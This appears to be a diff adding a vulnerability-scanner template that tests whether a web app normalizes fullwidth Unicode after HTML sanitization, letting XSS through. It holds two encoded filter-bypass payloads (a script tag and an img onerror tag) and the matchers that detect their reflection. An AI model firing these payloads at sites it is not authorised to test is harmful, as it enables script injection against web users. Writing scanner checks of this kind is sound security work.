@@ -1,0 +1,31 @@
+id: unicode-normalization-xss-bypass
+
+info:
+  name: Unicode Normalization XSS Filter Bypass
+  author: custom
+  severity: high
+  description: |
+    The app applies NFKC/NFC Unicode normalization AFTER HTML sanitization.
+    Fullwidth characters (U+FF1C for <, U+FF1E for >) normalize to ASCII
+    after the filter runs, bypassing XSS protection.
+  reference:
+    - https://appcheck-ng.com/unicode-normalization-vulnerabilities-the-special-k-polyglot/
+  tags: xss,unicode,normalization,bypass
+
+http:
+  - method: GET
+    path:
+      - "{{BaseURL}}?name=%EF%BC%9Cscript%EF%BC%9Ealert(1)%EF%BC%9C/script%EF%BC%9E"
+      - "{{BaseURL}}?q=%EF%BC%9Cimg%20src%3Dx%20onerror%3Dalert(1)%EF%BC%9E"
+
+    matchers-condition: and
+    matchers:
+      - type: word
+        words:
+          - "<script>alert(1)</script>"
+          - "<img src=x onerror=alert(1)>"
+        condition: or
+
+      - type: status
+        status:
+          - 200
